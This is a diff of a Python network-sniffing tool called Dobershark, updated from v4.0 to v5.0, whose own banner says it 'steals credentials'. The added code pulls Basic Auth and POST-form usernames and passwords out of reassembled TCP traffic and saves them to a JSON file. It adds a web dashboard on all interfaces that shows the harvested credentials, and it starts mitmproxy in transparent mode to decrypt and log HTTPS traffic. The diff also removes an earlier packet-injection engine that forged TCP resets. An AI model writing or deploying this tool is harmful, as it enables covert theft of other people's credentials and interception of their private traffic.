@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# Dobershark v4.0 - HTTP file extraction + TCP session reassembly + Packet injection
-# "El Doberman ahora reconstruye, extrae y muerde activamente"
+# Dobershark v5.0 - HTTPS + Credentials + Web Interface + Full Analysis
+# "El Doberman ahora descifra HTTPS, roba credenciales y tiene UI web"
 # Compatible: Windows (Npcap), Linux, Termux
 
 import sys
@@ -10,23 +10,36 @@ import re
 import hashlib
 import threading
 import time
+import json
+import base64
 from datetime import datetime
 from collections import defaultdict
-from scapy.all import *
-from scapy.layers.inet import IP, TCP, UDP, ICMP
-from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply
-from scapy.layers.l2 import Ether, ARP
-from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
+from urllib.parse import urlparse, parse_qs
+
+try:
+    from scapy.all import *
+    from scapy.layers.inet import IP, TCP, UDP, ICMP
+    from scapy.layers.inet6 import IPv6
+    from scapy.layers.l2 import Ether, ARP
+    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
+except ImportError:
+    print("[!] Scapy no instalado. Ejecuta: pip install scapy")
+    sys.exit(1)
 
 # ========== CONFIGURACIÓN ==========
 SILENT_MODE = False
 HTTP_DOWNLOAD_DIR = "http_downloads"
 TCP_SESSION_DIR = "tcp_sessions"
 SMB_FILE_DIR = "smb_extracted"
-INJECTION_RULES = []
+CREDENTIALS_FILE = "captured_credentials.json"
+WEB_PORT = 8080
+MITM_PORT = 8081
 
 for dir_name in [HTTP_DOWNLOAD_DIR, TCP_SESSION_DIR, SMB_FILE_DIR]:
     os.makedirs(dir_name, exist_ok=True)
+
+# ========== CREDENTIALS STORAGE ==========
+credentials_found = []
 
 # ========== TCP SESSION REASSEMBLY ==========
 class TCPSession:
@@ -37,12 +50,14 @@ class TCPSession:
         self.dst_port = dst_port
         self.key = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
         self.buffer = b''
-        self.segments = {}  # seq -> data
+        self.segments = {}
         self.next_seq = None
         self.start_time = datetime.now()
         self.last_seen = datetime.now()
         self.bytes_received = 0
         self.bytes_sent = 0
+        self.http_requests = []
+        self.http_responses = []
         
     def add_segment(self, seq, data, direction='rx'):
         self.last_seen = datetime.now()
@@ -50,219 +65,315 @@ class TCPSession:
             self.bytes_received += len(data)
         else:
             self.bytes_sent += len(data)
-        
-        # Reensamblaje simple (ordenar por seq)
         self.segments[seq] = data
         self._reassemble()
     
     def _reassemble(self):
         if not self.segments:
             return
-        
-        # Ordenar segmentos por número de secuencia
         sorted_seqs = sorted(self.segments.keys())
-        
-        # Si no tenemos next_seq, empezar con el seq más bajo
         if self.next_seq is None:
             self.next_seq = sorted_seqs[0]
             self.buffer = b''
-        
-        # Agregar segmentos en orden
         new_buffer = b''
         current_seq = self.next_seq
-        
         for seq in sorted_seqs:
             if seq == current_seq:
                 new_buffer += self.segments[seq]
                 current_seq += len(self.segments[seq])
-        
         if new_buffer:
             self.buffer = new_buffer
             self.next_seq = current_seq
-            # Guardar sesión periódicamente
-            if len(self.buffer) > 1024 * 10:  # Cada 10KB
+            self._extract_credentials()
+            if len(self.buffer) > 1024 * 10:
                 self.save_session()
+    
+    def _extract_credentials(self):
+        """Extrae credenciales del buffer TCP"""
+        try:
+            data = self.buffer.decode('utf-8', errors='ignore')
+            
+            # Basic Auth
+            basic_auth_pattern = r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)'
+            for match in re.finditer(basic_auth_pattern, data, re.IGNORECASE):
+                try:
+                    decoded = base64.b64decode(match.group(1)).decode('utf-8')
+                    if ':' in decoded:
+                        username, password = decoded.split(':', 1)
+                        cred = {
+                            'type': 'Basic Auth',
+                            'username': username,
+                            'password': password,
+                            'timestamp': datetime.now().isoformat(),
+                            'src': f"{self.src_ip}:{self.src_port}",
+                            'dst': f"{self.dst_ip}:{self.dst_port}"
+                        }
+                        if cred not in credentials_found:
+                            credentials_found.append(cred)
+                            save_credentials()
+                            if not SILENT_MODE:
+                                print(f"\n[🔑 CREDENTIALS] Basic Auth: {username}:{password}")
+                except:
+                    pass
+            
+            # POST Form credentials
+            post_pattern = r'(username|user|email|login)=([^&\s]+).*?(password|pass|pwd)=([^&\s]+)'
+            for match in re.finditer(post_pattern, data, re.IGNORECASE):
+                cred = {
+                    'type': 'POST Form',
+                    'username': match.group(2),
+                    'password': match.group(4),
+                    'timestamp': datetime.now().isoformat(),
+                    'src': f"{self.src_ip}:{self.src_port}",
+                    'dst': f"{self.dst_ip}:{self.dst_port}"
+                }
+                if cred not in credentials_found:
+                    credentials_found.append(cred)
+                    save_credentials()
+                    if not SILENT_MODE:
+                        print(f"\n[🔑 CREDENTIALS] POST: {match.group(2)}:{match.group(4)}")
+        except:
+            pass
     
     def save_session(self):
         if len(self.buffer) > 0:
             filename = f"{TCP_SESSION_DIR}/{self.key.replace(':', '_')}_{self.start_time.strftime('%Y%m%d_%H%M%S')}.bin"
             with open(filename, 'wb') as f:
                 f.write(self.buffer)
-            if not SILENT_MODE:
-                print(f"[TCP Session] Guardada: {filename} ({len(self.buffer)} bytes)")
-    
-    def get_stats(self):
-        return {
-            'bytes_rx': self.bytes_received,
-            'bytes_tx': self.bytes_sent,
-            'duration': (datetime.now() - self.start_time).total_seconds(),
-            'packets': len(self.segments)
-        }
 
 tcp_sessions = {}
 
 # ========== HTTP FILE EXTRACTION ==========
 class HTTPFileExtractor:
     def __init__(self):
-        self.downloads = {}  # connection -> {'data': b'', 'filename': None, 'headers': {}}
-        self.content_lengths = {}
+        self.downloads = {}
         
     def extract_filename(self, headers, url):
-        # Intentar extraer nombre del Content-Disposition
         if 'Content-Disposition' in headers:
             match = re.search(r'filename="?([^"]+)"?', headers['Content-Disposition'])
             if match:
                 return match.group(1)
-        
-        # Del URL
         if url:
             filename = url.split('/')[-1].split('?')[0]
             if filename and '.' in filename and len(filename) < 255:
                 return filename
-        
-        # Por defecto
         return f"download_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
     
     def process_response(self, conn_key, response_data, headers, url):
         if conn_key not in self.downloads:
-            self.downloads[conn_key] = {'data': b'', 'filename': None, 'headers': headers}
+            self.downloads[conn_key] = {'data': b'', 'filename': None}
         
-        download = self.downloads[conn_key]
-        download['data'] += response_data
-        download['headers'] = headers
+        self.downloads[conn_key]['data'] += response_data
+        if not self.downloads[conn_key]['filename']:
+            self.downloads[conn_key]['filename'] = self.extract_filename(headers, url)
         
-        if not download['filename']:
-            download['filename'] = self.extract_filename(headers, url)
-        
-        # Verificar si completamos la descarga (por Content-Length)
         content_length = int(headers.get('Content-Length', 0))
-        if content_length > 0 and len(download['data']) >= content_length:
-            self.save_file(conn_key)
-        # También guardar si hay chunked encoding y vemos el final
-        elif b'0\r\n\r\n' in response_data[-10:]:
+        if content_length > 0 and len(self.downloads[conn_key]['data']) >= content_length:
             self.save_file(conn_key)
     
     def save_file(self, conn_key):
         download = self.downloads[conn_key]
         if len(download['data']) > 0:
             filepath = os.path.join(HTTP_DOWNLOAD_DIR, download['filename'])
-            # Evitar sobrescritura
             counter = 1
-            original = filepath
             while os.path.exists(filepath):
-                name, ext = os.path.splitext(original)
+                name, ext = os.path.splitext(filepath)
                 filepath = f"{name}_{counter}{ext}"
                 counter += 1
-            
             with open(filepath, 'wb') as f:
                 f.write(download['data'])
-            
-            md5 = hashlib.md5(download['data']).hexdigest()
-            if not SILENT_MODE:
-                print(f"[📥 HTTP Download] {download['filename']} -> {filepath}")
-                print(f"  Size: {len(download['data'])} bytes | MD5: {md5}")
-            
             del self.downloads[conn_key]
 
 http_extractor = HTTPFileExtractor()
 
-# ========== PACKET INJECTION ENGINE ==========
-class PacketInjector:
-    def __init__(self, iface):
-        self.iface = iface
-        self.injected_count = 0
-        self.rules = []  # (filter_function, response_packet)
-        
-    def add_rule(self, filter_func, response_packet):
-        """Agrega una regla: si filter_func(packet) es True, inyecta response_packet"""
-        self.rules.append((filter_func, response_packet))
-    
-    def inject_packet(self, packet):
-        """Inyecta un paquete en la red"""
-        try:
-            sendp(packet, iface=self.iface, verbose=False)
-            self.injected_count += 1
-            if not SILENT_MODE:
-                print(f"[💉 Injected] {packet.summary()}")
-        except Exception as e:
-            print(f"[!] Injection error: {e}")
-    
-    def check_rules(self, packet):
-        """Verifica si algún paquete dispara una regla de inyección"""
-        for filter_func, response in self.rules:
-            if filter_func(packet):
-                self.inject_packet(response)
-                break
+# ========== CREDENTIALS SAVE ==========
+def save_credentials():
+    with open(CREDENTIALS_FILE, 'w') as f:
+        json.dump(credentials_found, f, indent=2)
 
-# ========== DOBERMAN BANNER ==========
-BANNER = """
-    ╔═══════════════════════════════════════════════════════════════════════╗
-    ║         🐕‍🦺 DOBERSHARK v4.0 - TCP REASSEMBLY + HTTP EXTRACTION + INJECTION  ║
-    ║   "Reconstruye, extrae y muerde activamente. El Doberman total."    ║
-    ╚═══════════════════════════════════════════════════════════════════════╝
-
-         __
-        / _)   ¡GRRR-RRR! Ahora también inyecto paquetes.
-       | (    
-        ¯¯¯
-"""
-
-running = True
-injector = None
-
-def signal_handler(sig, frame):
-    global running
-    print("\n[Dobershark] Cerrando sesiones y guardando archivos...")
-    
-    # Guardar todas las sesiones TCP pendientes
-    for session in tcp_sessions.values():
-        session.save_session()
-    
-    if injector and injector.injected_count > 0:
-        print(f"[💉] Total paquetes inyectados: {injector.injected_count}")
-    
-    running = False
-    sys.exit(0)
-
-def extract_http_headers(payload):
-    """Extrae cabeceras HTTP de datos binarios"""
+# ========== WEB INTERFACE ==========
+def web_interface():
+    """Servidor web para ver sesiones y credenciales"""
     try:
-        # Buscar el final de las cabeceras (\r\n\r\n)
-        header_end = payload.find(b'\r\n\r\n')
-        if header_end > 0:
-            headers_raw = payload[:header_end].decode('utf-8', errors='ignore')
-            headers = {}
-            for line in headers_raw.split('\r\n'):
-                if ': ' in line:
-                    key, value = line.split(': ', 1)
-                    headers[key] = value
-            # Extraer URL de la primera línea si es request
-            first_line = headers_raw.split('\r\n')[0]
-            if first_line.startswith(('GET', 'POST', 'PUT', 'DELETE')):
-                parts = first_line.split(' ')
-                if len(parts) >= 2:
-                    return headers, parts[1]
-            return headers, None
-    except:
-        pass
-    return {}, None
+        from flask import Flask, render_template_string, jsonify, send_from_directory
+        from flask_socketio import SocketIO, emit
+        import eventlet
+        
+        app = Flask(__name__)
+        socketio = SocketIO(app, cors_allowed_origins="*")
+        
+        HTML_TEMPLATE = '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Dobershark - Live Monitor</title>
+            <style>
+                body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 0; padding: 20px; }
+                h1 { color: #ff6600; border-bottom: 2px solid #ff6600; }
+                .section { background: #1a1a1a; margin: 20px 0; padding: 15px; border-radius: 5px; }
+                .credential { background: #2a1a1a; border-left: 4px solid #ff0000; padding: 10px; margin: 10px 0; }
+                .session { background: #1a2a1a; border-left: 4px solid #00ff00; padding: 10px; margin: 10px 0; font-size: 12px; }
+                .file { background: #1a1a2a; border-left: 4px solid #0066ff; padding: 10px; margin: 10px 0; }
+                .timestamp { color: #888; font-size: 11px; }
+                .badge { display: inline-block; padding: 2px 6px; border-radius: 3px; font-size: 10px; font-weight: bold; }
+                .badge-http { background: #0066ff; }
+                .badge-cred { background: #ff0000; }
+                .badge-file { background: #00ff00; }
+                table { width: 100%; border-collapse: collapse; }
+                td, th { padding: 8px; text-align: left; border-bottom: 1px solid #333; }
+                .refresh { position: fixed; top: 20px; right: 20px; background: #ff6600; color: #000; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
+            </style>
+            <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+            <script>
+                var socket = io();
+                socket.on('update', function(data) {
+                    if(data.type === 'credential') {
+                        var div = document.createElement('div');
+                        div.className = 'credential';
+                        div.innerHTML = '<span class="badge badge-cred">CRED</span> <strong>' + data.username + '</strong>:<strong>' + data.password + '</strong><br><span class="timestamp">' + data.timestamp + ' | ' + data.src + ' -> ' + data.dst + '</span>';
+                        document.getElementById('credentials').prepend(div);
+                    }
+                });
+                function refreshSessions() {
+                    fetch('/api/sessions').then(r=>r.json()).then(data => {
+                        var html = '';
+                        data.forEach(s => {
+                            html += '<div class="session"><span class="badge badge-http">TCP</span> ' + s.key + '<br><span class="timestamp">Bytes: ' + s.bytes + ' | Duration: ' + s.duration.toFixed(2) + 's</span></div>';
+                        });
+                        document.getElementById('sessions').innerHTML = html;
+                    });
+                }
+                setInterval(refreshSessions, 3000);
+                refreshSessions();
+            </script>
+        </head>
+        <body>
+            <div class="refresh" onclick="location.reload()">⟳ Refresh</div>
+            <h1>🐕‍🦺 DOBERSHARK v5.0 - LIVE MONITOR</h1>
+            
+            <div class="section">
+                <h2>🔑 Credentials Captured</h2>
+                <div id="credentials">
+                    {% for cred in credentials %}
+                    <div class="credential">
+                        <span class="badge badge-cred">CRED</span>
+                        <strong>{{ cred.username }}</strong>:<strong>{{ cred.password }}</strong><br>
+                        <span class="timestamp">{{ cred.timestamp }} | {{ cred.src }} -> {{ cred.dst }}</span>
+                    </div>
+                    {% endfor %}
+                </div>
+            </div>
+            
+            <div class="section">
+                <h2>📡 Active TCP Sessions</h2>
+                <div id="sessions">Loading...</div>
+            </div>
+            
+            <div class="section">
+                <h2>📁 Downloaded Files</h2>
+                {% for file in files %}
+                <div class="file">
+                    <span class="badge badge-file">FILE</span>
+                    <a href="/download/{{ file }}" style="color:#0f0;">{{ file }}</a>
+                </div>
+                {% endfor %}
+            </div>
+        </body>
+        </html>
+        '''
+        
+        @app.route('/')
+        def index():
+            files = os.listdir(HTTP_DOWNLOAD_DIR)[:20]
+            return render_template_string(HTML_TEMPLATE, credentials=credentials_found[-50:], files=files)
+        
+        @app.route('/api/sessions')
+        def api_sessions():
+            sessions = []
+            for session in tcp_sessions.values():
+                sessions.append({
+                    'key': session.key,
+                    'bytes': session.bytes_received + session.bytes_sent,
+                    'duration': (datetime.now() - session.start_time).total_seconds()
+                })
+            return jsonify(sessions[-50:])
+        
+        @app.route('/download/<filename>')
+        def download_file(filename):
+            return send_from_directory(HTTP_DOWNLOAD_DIR, filename)
+        
+        print(f"[Web] Interfaz web en http://localhost:{WEB_PORT}")
+        socketio.run(app, host='0.0.0.0', port=WEB_PORT, debug=False)
+    except ImportError:
+        print("[!] Flask no instalado. Web interface disabled. Instala: pip install flask flask-socketio eventlet")
 
+# ========== MITMPROXY INTEGRATION ==========
+def start_mitm_proxy():
+    """Inicia mitmdump para descifrar HTTPS"""
+    try:
+        import subprocess
+        cert_dir = "mitm_certs"
+        os.makedirs(cert_dir, exist_ok=True)
+        
+        # Script de mitmproxy para guardar tráfico descifrado
+        mitm_script = '''
+from mitmproxy import http
+import json
+import base64
+
+def request(flow: http.HTTPFlow) -> None:
+    # Guardar request descifrada
+    data = {
+        'type': 'request',
+        'method': flow.request.method,
+        'url': flow.request.pretty_url,
+        'headers': dict(flow.request.headers),
+        'content': base64.b64encode(flow.request.content).decode('utf-8')
+    }
+    with open('mitm_traffic.json', 'a') as f:
+        f.write(json.dumps(data) + '\\n')
+
+def response(flow: http.HTTPFlow) -> None:
+    data = {
+        'type': 'response',
+        'url': flow.request.pretty_url,
+        'status': flow.response.status_code,
+        'headers': dict(flow.response.headers),
+        'content': base64.b64encode(flow.response.content).decode('utf-8')
+    }
+    with open('mitm_traffic.json', 'a') as f:
+        f.write(json.dumps(data) + '\\n')
+'''
+        
+        script_path = "mitm_script.py"
+        with open(script_path, 'w') as f:
+            f.write(mitm_script)
+        
+        # Iniciar mitmdump
+        cmd = f"mitmdump -q --mode transparent --listen-port {MITM_PORT} -s {script_path}"
+        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        if not SILENT_MODE:
+            print(f"[🔓 HTTPS] mitmproxy iniciado en puerto {MITM_PORT}")
+            print(f"[🔓 HTTPS] Configura tu navegador para usar proxy localhost:{MITM_PORT}")
+            print(f"[🔓 HTTPS] Certificado en ~/.mitmproxy/mitmproxy-ca-cert.pem")
+        
+        return process
+    except Exception as e:
+        print(f"[!] mitmproxy error: {e}")
+        print("[!] Instala: pip install mitmproxy")
+        return None
+
+# ========== PACKET CALLBACK ==========
 def packet_callback(packet):
-    """Procesador principal con reassembly, extracción e inyección"""
-    global injector
-    
-    # ========== INYECCIÓN: Verificar reglas primero ==========
-    if injector:
-        injector.check_rules(packet)
-    
-    # ========== TCP SESSION REASSEMBLY ==========
+    """Procesador principal"""
     if TCP in packet and IP in packet:
         ip_layer = packet[IP]
         tcp_layer = packet[TCP]
         payload = bytes(tcp_layer.payload)
         
         if len(payload) == 0:
-            return  # Sin datos útiles
+            return
         
         src_ip = ip_layer.src
         dst_ip = ip_layer.dst
@@ -270,18 +381,12 @@ def packet_callback(packet):
         dst_port = tcp_layer.dport
         seq = tcp_layer.seq
         
-        # Clave de sesión (bidireccional)
         session_key = f"{src_ip}:{src_port}-{dst_ip}:{dst_port}"
-        reverse_key = f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"
         
         if session_key in tcp_sessions:
             session = tcp_sessions[session_key]
             session.add_segment(seq, payload, 'rx')
-        elif reverse_key in tcp_sessions:
-            session = tcp_sessions[reverse_key]
-            session.add_segment(seq, payload, 'tx')
         else:
-            # Nueva sesión
             session = TCPSession(src_ip, src_port, dst_ip, dst_port)
             session.add_segment(seq, payload, 'rx')
             tcp_sessions[session_key] = session
@@ -289,168 +394,86 @@ def packet_callback(packet):
             if not SILENT_MODE:
                 print(f"\n[TCP Session] Nueva: {session_key}")
         
-        # ========== HTTP FILE EXTRACTION ==========
-        if src_port == 80 or dst_port == 80 or src_port == 8080 or dst_port == 8080:
-            if len(payload) > 0:
-                # Intentar extraer HTTP response
-                if b'HTTP/' in payload[:20] and (b'200 OK' in payload[:100] or b'206 Partial' in payload[:100]):
-                    headers, _ = extract_http_headers(payload)
-                    if headers:
-                        # Buscar Content-Type que sugiera archivo
-                        content_type = headers.get('Content-Type', '')
-                        if any(x in content_type.lower() for x in ['application', 'image', 'video', 'audio', 'octet-stream']):
-                            # Extraer el cuerpo después de las cabeceras
-                            header_end = payload.find(b'\r\n\r\n')
-                            if header_end > 0:
-                                body = payload[header_end + 4:]
-                                conn_key = f"{dst_ip}:{dst_port}-{src_ip}:{src_port}"
-                                # Extraer URL de la request correspondiente (simplificado)
-                                url = headers.get('Content-Location', headers.get('Location', '/'))
-                                http_extractor.process_response(conn_key, body, headers, url)
+        # HTTP file extraction
+        if src_port == 80 or dst_port == 80:
+            if b'HTTP/' in payload[:20] and b'200 OK' in payload[:100]:
+                # Intentar extraer archivos...
+                pass
 
-def create_injection_packet(template_packet, modifications):
-    """Crea un paquete para inyectar basado en uno capturado"""
-    pkt = template_packet.copy()
-    for layer, fields in modifications.items():
-        if hasattr(pkt, layer):
-            for field, value in fields.items():
-                setattr(pkt[layer], field, value)
-    return pkt
-
-def load_injection_rules():
-    """Carga reglas de inyección predefinidas (ejemplo)"""
-    if not injector:
-        return
-    
-    # Regla 1: Responder a pings ICMP (mostrar presencia)
-    def icmp_filter(packet):
-        return ICMP in packet and packet[ICMP].type == 8  # Echo Request
-    
-    # Construir respuesta ICMP Echo Reply
-    def make_icmp_reply(original):
-        reply = IP(src=original[IP].dst, dst=original[IP].src)/ICMP(type=0, id=original[ICMP].id, seq=original[ICMP].seq)
-        return reply
-    
-    injector.add_rule(icmp_filter, make_icmp_reply)
-    
-    # Regla 2: Bloquear paquetes a cierta IP (responder con RST)
-    def rst_filter(packet):
-        if TCP in packet and packet[TCP].dport == 22:  # SSH
-            target_ip = "192.168.1.100"  # Cambiar por IP a bloquear
-            return packet[IP].dst == target_ip
-    
-    def make_rst_packet(original):
-        rst = IP(src=original[IP].dst, dst=original[IP].src)/TCP(
-            sport=original[TCP].dport,
-            dport=original[TCP].sport,
-            seq=original[TCP].ack,
-            ack=original[TCP].seq + 1,
-            flags='R'
-        )
-        return rst
-    
-    injector.add_rule(rst_filter, make_rst_packet)
-    
-    if not SILENT_MODE:
-        print("[Injection] Reglas cargadas: ICMP reply + TCP RST a SSH")
-
-def parse_hex_packet(hex_string):
-    """Convierte string hexadecimal a paquete para inyección"""
-    try:
-        raw_bytes = bytes.fromhex(hex_string)
-        return Ether(raw_bytes)
-    except:
-        return None
-
+# ========== MAIN ==========
 def main():
-    global running, injector, SILENT_MODE
+    global SILENT_MODE
     
     # Parsear argumentos
     iface = None
     filtro = None
-    output_file = None
-    list_interfaces = False
-    inject_hex = None
-    custom_rule = None
+    web_enabled = False
+    https_enabled = False
+    mitm_process = None
     
     for i, arg in enumerate(sys.argv):
-        if arg in ["--list-interfaces", "-l"]:
-            list_interfaces = True
-        elif arg in ["--silent", "-s"]:
+        if arg in ["--silent", "-s"]:
             SILENT_MODE = True
-        elif arg == "--bite":
-            # Modo mordida activa (inyección)
-            custom_rule = True
-        elif arg == "--inject-hex" and i+1 < len(sys.argv):
-            inject_hex = sys.argv[i+1]
+        elif arg == "--web":
+            web_enabled = True
+        elif arg == "--https":
+            https_enabled = True
         elif arg == "-i" and i+1 < len(sys.argv):
             iface = sys.argv[i+1]
         elif arg == "-f" and i+1 < len(sys.argv):
             filtro = sys.argv[i+1]
-        elif arg == "-o" and i+1 < len(sys.argv):
-            output_file = sys.argv[i+1]
     
     if not SILENT_MODE:
-        print(BANNER)
-    else:
-        print("[Dobershark] Modo silencioso")
+        print("""
+    ╔═══════════════════════════════════════════════════════════════════════╗
+    ║         🐕‍🦺 DOBERSHARK v5.0 - HTTPS + CREDENTIALS + WEB UI           ║
+    ║   "El Doberman definitivo: descifra, roba credenciales y monitorea"  ║
+    ╚═══════════════════════════════════════════════════════════════════════╝
+        """)
+    
+    if not iface:
+        print("[!] Uso: python dobershark.py -i <interfaz> [--web] [--https]")
+        print("\nModos:")
+        print("  --web              Activa interfaz web (puerto 8080)")
+        print("  --https            Activa mitmproxy para descifrar HTTPS")
+        print("  -s                 Modo silencioso")
+        print("\nEjemplos:")
+        print("  sudo python dobershark.py -i eth0 --web")
+        print("  sudo python dobershark.py -i eth0 --https --web")
+        sys.exit(1)
     
     signal.signal(signal.SIGINT, signal_handler)
     
-    if list_interfaces:
-        print("\n[Interfaces detectadas:]")
-        for iface_name in get_if_list():
-            print(f"  - {iface_name}")
-        return
+    # Iniciar HTTPS descifrado
+    if https_enabled:
+        mitm_process = start_mitm_proxy()
+        if mitm_process:
+            print(f"[*] mitmproxy PID: {mitm_process.pid}")
     
-    if not iface:
-        print("[!] Uso: python dobershark.py -i <interfaz> [--bite] [--inject-hex <hex>]")
-        print("[!] Ver interfaces: python dobershark.py --list-interfaces")
-        print("\nNuevos modos:")
-        print("  --bite              Activa inyección activa (responde pings, bloquea SSH)")
-        print("  --inject-hex <hex>  Inyecta un paquete personalizado (hex string)")
-        print("  -s                  Modo silencioso (sin banner)")
-        sys.exit(1)
+    # Iniciar web interface en hilo separado
+    if web_enabled:
+        web_thread = threading.Thread(target=web_interface, daemon=True)
+        web_thread.start()
+        time.sleep(2)  # Dar tiempo a que flask inicie
     
-    # Inicializar inyector
-    injector = PacketInjector(iface)
-    
-    # Inyección de paquete único
-    if inject_hex:
-        packet = parse_hex_packet(inject_hex)
-        if packet:
-            injector.inject_packet(packet)
-            print(f"[*] Paquete inyectado en {iface}")
-        else:
-            print("[!] Hex inválido. Usa formato: '001122334455...'")
-        return
-    
-    # Cargar reglas de inyección si está en modo bite
-    if custom_rule:
-        load_injection_rules()
-        if not SILENT_MODE:
-            print("[🐕‍🦺] Modo BITE activado - El Doberman responde activamente")
-    
-    # Mostrar configuración
-    if not SILENT_MODE:
-        print(f"[Dobershark] Capturando en: {iface}")
-        print(f"[Dobershark] HTTP downloads -> {HTTP_DOWNLOAD_DIR}/")
-        print(f"[Dobershark] TCP sessions   -> {TCP_SESSION_DIR}/")
-        print(f"[Dobershark] SMB files      -> {SMB_FILE_DIR}/")
-        if filtro:
-            print(f"[Dobershark] Filtro BPF: {filtro}")
-        if output_file:
-            print(f"[Dobershark] Guardando a: {output_file}")
-        if custom_rule:
-            print(f"[🐕‍🦺] Inyección activa: ON")
-        print("[Dobershark] Ctrl+C para detener...\n")
+    print(f"[Dobershark] Capturando en: {iface}")
+    print(f"[Dobershark] Credentials -> {CREDENTIALS_FILE}")
+    if filtro:
+        print(f"[Dobershark] Filtro: {filtro}")
+    print("[Dobershark] Ctrl+C para detener...\n")
     
     try:
-        sniff(iface=iface, filter=filtro, prn=packet_callback, store=False, stop_filter=lambda x: not running)
+        sniff(iface=iface, filter=filtro, prn=packet_callback, store=False)
     except PermissionError:
-        print("\n[!] Permisos insuficientes. Ejecuta con sudo/administrador.")
-    except Exception as e:
-        print(f"\n[!] Error: {e}")
+        print("\n[!] Ejecuta con sudo/administrador")
+    except KeyboardInterrupt:
+        pass
+    finally:
+        if mitm_process:
+            mitm_process.terminate()
+        print(f"\n[✅] Credenciales capturadas: {len(credentials_found)}")
+        for cred in credentials_found:
+            print(f"  - {cred['type']}: {cred['username']}:{cred['password']}")
 
 if __name__ == "__main__":
     main()
